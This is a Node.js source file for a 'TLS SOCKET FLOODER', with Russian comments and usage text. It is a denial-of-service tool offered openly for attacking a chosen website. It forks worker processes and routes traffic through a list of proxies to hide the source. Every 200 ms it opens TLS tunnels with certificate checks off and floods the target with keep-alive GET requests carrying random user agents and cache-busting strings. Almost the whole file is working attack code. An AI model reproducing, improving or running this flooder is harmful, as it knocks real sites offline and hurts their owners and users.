const fs = require("fs");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const randomUserAgent = require('random-ua');
const winston = require("winston");
const os = require("os");
const path = require("path");

// Конфигурация логирования
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.printf(({ timestamp, level, message }) => {
      return `${timestamp} [${level.toUpperCase()}]: ${message}`;
    })
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'flood.log' })
  ]
});

require("events").EventEmitter.defaultMaxListeners = Infinity;

// Вывод логотипа и команд
console.log(`
╭────────────────────━━━━━━━━━━━━━━━━━━━━━────────────────╮
|                     TLS SOCKET FLOODER                  |
|                        by geniuszly                     |
╰────────────────────━━━━━━━━━━━━━━━━━━━━━────────────────╯
`);

console.log(`
Использование: node ${path.basename(__filename)} [targetUrl] [duration] [concurrentRequests] [threads]
Примеры:
- node ${path.basename(__filename)} http://example.com 60 100 4
- node ${path.basename(__filename)} https://example.com 120 200 8

Параметры:
- [targetUrl]: URL целевого сайта, который вы хотите атаковать.
- [duration]: Длительность атаки в секундах.
- [concurrentRequests]: Количество одновременных запросов.
- [threads]: Количество потоков для выполнения атаки.
`);

const targetUrl = process.argv[2];
const attackDuration = Number(process.argv[3]) || 60;
const concurrentRequests = Number(process.argv[4]) || 10;
const numThreads = Number(process.argv[5]) || os.cpus().length;

if (!targetUrl) {
  logger.error("Не указан URL цели. Использование: node main.js <targetUrl> <attackDuration> <concurrentRequests> <numThreads>");
  process.exit(1);
}

let parsedHost;
try {
  parsedHost = new URL(targetUrl).host;
} catch (e) {
  logger.error(`Недействительный URL: ${targetUrl}`);
  process.exit(1);
}

// Загрузка прокси
let proxyList = fs.readFileSync("proxy.txt", "utf-8")
  .split("\n")
  .map(line => line.trim())
  .filter(line => line);

// Проверка доступности прокси
function validateProxies(proxyList) {
  return proxyList.filter(proxy => {
    try {
      let [host, port] = proxy.split(":");
      let req = http.request({ host, port, method: 'HEAD', timeout: 2000 });
      req.on('error', () => false);
      req.end();
      return true;
    } catch {
      return false;
    }
  });
}

proxyList = validateProxies(proxyList);

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function logMessage(message) {
  logger.info(message);
}

function generateRandomString(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function buildHttpRequest(target, host) {
  return `GET ${target} HTTP/1.3\r\n` +
    `Host: ${host}\r\n` +
    `Referer: ${target}\r\n` +
    `Origin: ${target}\r\n` +
    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n` +
    `user-agent: ${randomUserAgent.generate()}\r\n` +
    `Upgrade-Insecure-Requests: 1\r\n` +
    `Accept-Encoding: br\r\n` +
    `Content-Type: *\r\n` +
    `Alt-Used: ${target}\r\n` +
    `Accept-Language: en-US,en;q=0.9\r\n` +
    `Cache-Control: max-age=0\r\n` +
    `Connection: Keep-Alive\r\n\r\n`;
}

function startAttack() {
  if (cluster.isMaster) {
    for (let i = 0; i < numThreads; i++) {
      cluster.fork();
    }
    cluster.on("exit", (worker, code, signal) => {
      logMessage(`Поток ${worker.process.pid} завершен`);
    });
  } else {
    performFlooding();
    logMessage(`Поток запущен на хосте: ${targetUrl}`);
  }
}

function performFlooding() {
  setInterval(() => {
    let targetWithRandom = targetUrl.includes("%RAND%")
      ? targetUrl.replace(/%RAND%/g, generateRandomString(16))
      : targetUrl;

    let proxy = proxyList[getRandomInt(0, proxyList.length)].split(":");

    const requestOptions = {
      host: proxy[0],
      port: proxy[1],
      method: "CONNECT",
      path: `${parsedHost}:443`,
      headers: {
        Host: parsedHost,
        "Proxy-Connection": "Keep-Alive",
        Connection: "Keep-Alive"
      }
    };

    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 50000,
      maxSockets: Infinity
    });

    const req = http.request(requestOptions, (res, socket, head) => {
      const tlsOptions = {
        host: parsedHost,
        servername: parsedHost,
        secure: true,
        rejectUnauthorized: false,
        sessionTimeout: 10000,
        socket: socket,
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_128_CBC_SHA256:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_CBC_SHA:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK"
      };

      const tlsConnection = tls.connect(tlsOptions, () => {
        for (let i = 0; i < concurrentRequests; i++) {
          tlsConnection.setKeepAlive(true, 10000);
          tlsConnection.setTimeout(10000);
          tlsConnection.write(buildHttpRequest(targetWithRandom, parsedHost));
        }
      });

      tlsConnection.on("data", () => {
        setTimeout(() => tlsConnection.end(), 10000);
      });

    });

    req.on("error", (err) => {
      logMessage(`Ошибка запроса: ${err.message}`);
    });

    req.end();

  }, 200);
}

startAttack();

setTimeout(() => {
  console.clear();
  logMessage("Атака завершена");
  process.exit(1);
}, attackDuration * 1000);
